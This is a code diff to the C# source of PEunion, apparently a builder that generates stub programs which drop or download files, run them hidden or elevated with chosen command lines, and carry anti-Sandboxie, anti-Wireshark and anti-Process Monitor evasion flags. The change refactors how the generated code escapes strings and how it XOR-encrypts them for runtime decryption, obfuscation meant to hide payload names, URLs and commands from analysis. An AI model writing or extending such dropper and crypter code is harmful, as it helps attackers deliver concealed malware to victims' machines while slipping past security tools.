@@ -110,24 +110,16 @@ namespace PEunion
 			{
 				if (item is ProjectFile file)
 				{
-					string fileName = file.Name.Trim();
-					string commandLine = file.CommandLine?.Trim() ?? "";
-					if (project.StringEncryption)
-					{
-						fileName = EncryptString(fileName);
-						commandLine = EncryptString(commandLine);
-					}
-
-					codeFilesPart.AppendLine("\t\tnew __FileItem__");
+					codeFilesPart.AppendLine("\t\tnew __FileItem__ // File");
 					codeFilesPart.AppendLine("\t\t{");
-					codeFilesPart.AppendLine("\t\t\t__C1_FileName__ = \"" + fileName + "\", // FileName: " + file.Name.Trim());
+					codeFilesPart.AppendLine("\t\t\t__C1_FileName__ = " + CreateStringLiteral(file.Name.Trim(), project.StringEncryption) + ", // FileName: " + CreateCommentLiteral(file.Name.Trim()));
 					codeFilesPart.AppendLine("\t\t\t__C1_Compress__ = " + (file.Compress ? "true" : "false") + ", // Compress");
 					codeFilesPart.AppendLine("\t\t\t__C1_Encrypt__ = " + (file.Encrypt ? "true" : "false") + ", // Encrypt");
 					codeFilesPart.AppendLine("\t\t\t__C1_Hidden__ = " + (file.Hidden ? "true" : "false") + ", // Hidden");
 					codeFilesPart.AppendLine("\t\t\t__C1_DropLocation__ = " + file.DropLocation + ", // DropLocation");
 					codeFilesPart.AppendLine("\t\t\t__C1_DropAction__ = " + file.DropAction + ", // DropAction");
 					codeFilesPart.AppendLine("\t\t\t__C1_Runas__ = " + (file.Runas ? "true" : "false") + ", // Runas");
-					codeFilesPart.AppendLine("\t\t\t__C1_CommandLine__ = \"" + commandLine + "\", // CommandLine: " + file.CommandLine?.Trim());
+					codeFilesPart.AppendLine("\t\t\t__C1_CommandLine__ = " + CreateStringLiteral(file.CommandLine?.Trim(), project.StringEncryption) + ", // CommandLine: " + CreateCommentLiteral(file.CommandLine?.Trim()));
 					codeFilesPart.AppendLine("\t\t\t__C1_AntiSandboxie__ = " + (file.AntiSandboxie ? "true" : "false") + ", // AntiSandboxie");
 					codeFilesPart.AppendLine("\t\t\t__C1_AntiWireshark__ = " + (file.AntiWireshark ? "true" : "false") + ", // AntiWireshark");
 					codeFilesPart.AppendLine("\t\t\t__C1_AntiProcessMonitor__ = " + (file.AntiProcessMonitor ? "true" : "false") + ", // AntiProcessMonitor");
@@ -159,25 +151,15 @@ namespace PEunion
 				}
 				else if (item is ProjectUrl url)
 				{
-					string address = url.Url.Trim();
-					string fileName = url.Name.Trim();
-					string commandLine = url.CommandLine?.Trim() ?? "";
-					if (project.StringEncryption)
-					{
-						address = EncryptString(address);
-						fileName = EncryptString(fileName);
-						commandLine = EncryptString(commandLine);
-					}
-
-					codeFilesPart.AppendLine("\t\tnew __UrlItem__");
+					codeFilesPart.AppendLine("\t\tnew __UrlItem__ // URL");
 					codeFilesPart.AppendLine("\t\t{");
-					codeFilesPart.AppendLine("\t\t\t__C2_Url__ = \"" + address + "\", // Url: " + url.Url.Trim());
-					codeFilesPart.AppendLine("\t\t\t__C2_FileName__ = \"" + fileName + "\", // FileName: " + url.Name.Trim());
+					codeFilesPart.AppendLine("\t\t\t__C2_Url__ = " + CreateStringLiteral(url.Url.Trim(), project.StringEncryption) + ", // Url: " + CreateCommentLiteral(url.Url.Trim()));
+					codeFilesPart.AppendLine("\t\t\t__C2_FileName__ = " + CreateStringLiteral(url.Name.Trim(), project.StringEncryption) + ", // FileName: " + CreateCommentLiteral(url.Name.Trim()));
 					codeFilesPart.AppendLine("\t\t\t__C2_Hidden__ = " + (url.Hidden ? "true" : "false") + ", // Hidden");
 					codeFilesPart.AppendLine("\t\t\t__C2_DropLocation__ = " + url.DropLocation + ", // DropLocation");
 					codeFilesPart.AppendLine("\t\t\t__C2_DropAction__ = " + url.DropAction + ", // DropAction");
 					codeFilesPart.AppendLine("\t\t\t__C2_Runas__ = " + (url.Runas ? "true" : "false") + ", // Runas");
-					codeFilesPart.AppendLine("\t\t\t__C2_CommandLine__ = \"" + commandLine + "\", // CommandLine: " + url.CommandLine?.Trim());
+					codeFilesPart.AppendLine("\t\t\t__C2_CommandLine__ = " + CreateStringLiteral(url.CommandLine?.Trim(), project.StringEncryption) + ", // CommandLine: " + CreateCommentLiteral(url.CommandLine?.Trim()));
 					codeFilesPart.AppendLine("\t\t\t__C2_AntiSandboxie__ = " + (url.AntiSandboxie ? "true" : "false") + ", // AntiSandboxie");
 					codeFilesPart.AppendLine("\t\t\t__C2_AntiWireshark__ = " + (url.AntiWireshark ? "true" : "false") + ", // AntiWireshark");
 					codeFilesPart.AppendLine("\t\t\t__C2_AntiProcessMonitor__ = " + (url.AntiProcessMonitor ? "true" : "false") + ", // AntiProcessMonitor");
@@ -185,22 +167,10 @@ namespace PEunion
 				}
 				else if (item is ProjectMessageBox messageBox)
 				{
-					string title = messageBox.Title ?? "";
-					string text = messageBox.Text ?? "";
-					if (project.StringEncryption)
-					{
-						title = EncryptString(title);
-						text = EncryptString(text);
-					}
-					else
-					{
-						text = text.Replace("\r\n", @"\r\n");
-					}
-
-					codeFilesPart.AppendLine("\t\tnew __MessageBoxItem__");
+					codeFilesPart.AppendLine("\t\tnew __MessageBoxItem__ // MessageBox");
 					codeFilesPart.AppendLine("\t\t{");
-					codeFilesPart.AppendLine("\t\t\t__C3_Title__ = \"" + title + "\", // Title: " + messageBox.Title);
-					codeFilesPart.AppendLine("\t\t\t__C3_Text__ = \"" + text + "\", // Text: " + messageBox.Text?.Replace("\r\n", @"\r\n"));
+					codeFilesPart.AppendLine("\t\t\t__C3_Title__ = " + CreateStringLiteral(messageBox.Title, project.StringEncryption) + ", // Title: " + CreateCommentLiteral(messageBox.Title));
+					codeFilesPart.AppendLine("\t\t\t__C3_Text__ = " + CreateStringLiteral(messageBox.Text, project.StringEncryption) + ", // Text: " + CreateCommentLiteral(messageBox.Text));
 					codeFilesPart.AppendLine("\t\t\t__C3_Buttons__ = MessageBoxButtons." + messageBox.Buttons + ", // Buttons");
 					codeFilesPart.AppendLine("\t\t\t__C3_Icon__ = MessageBoxIcon." + messageBox.Icon + ", // Icon");
 				}
@@ -260,14 +230,8 @@ namespace PEunion
 				.ForEach(match =>
 				{
 					string str = match.Groups[0].Value;
-					if (project.StringLiteralEncryption)
-					{
-						code = code.Replace(str, "__F_DecryptString__(\"" + EncryptString(str.SubstringBetween("\"", "\"").Replace(@"\\", @"\")) + "\")");
-					}
-					else
-					{
-						code = code.Replace(str, "\"" + str.SubstringBetween("\"", "\"") + "\"");
-					}
+					string stringContent = str.SubstringFrom("\"").SubstringUntil("\"", true);
+					code = code.Replace(str, CreateStringLiteral(stringContent, project.StringLiteralEncryption));
 				});
 
 			WindowMain.Singleton.OverlayTitle = "Obfuscation...";
@@ -338,10 +302,24 @@ namespace PEunion
 				return memoryStream.ToArray();
 			}
 		}
-		private static string EncryptString(string str)
+		private static string CreateStringLiteral(string str, bool encrypt)
 		{
-			byte key = MathEx.Random.NextByte();
-			return @"\x" + key.ToString("x") + str.Select(c => @"\x" + (c ^ key).ToString("x")).CreateString();
+			str = str ?? "";
+
+			if (encrypt)
+			{
+				str = str.Replace(@"\\", @"\").Replace("\\\"", "\"");
+				byte key = MathEx.Random.NextByte();
+				return "__F_DecryptString__(\"\\x" + key.ToString("x") + str.Select(c => @"\x" + (c ^ key).ToString("x")).CreateString() + "\")";
+			}
+			else
+			{
+				return "\"" + str.Replace("\"", "\\\"").Replace("\r", @"\r").Replace("\n", @"\n") + "\"";
+			}
+		}
+		private static string CreateCommentLiteral(string str)
+		{
+			return str?.Replace("\r", @"\r").Replace("\n", @"\n") ?? "";
 		}
 	}
 }
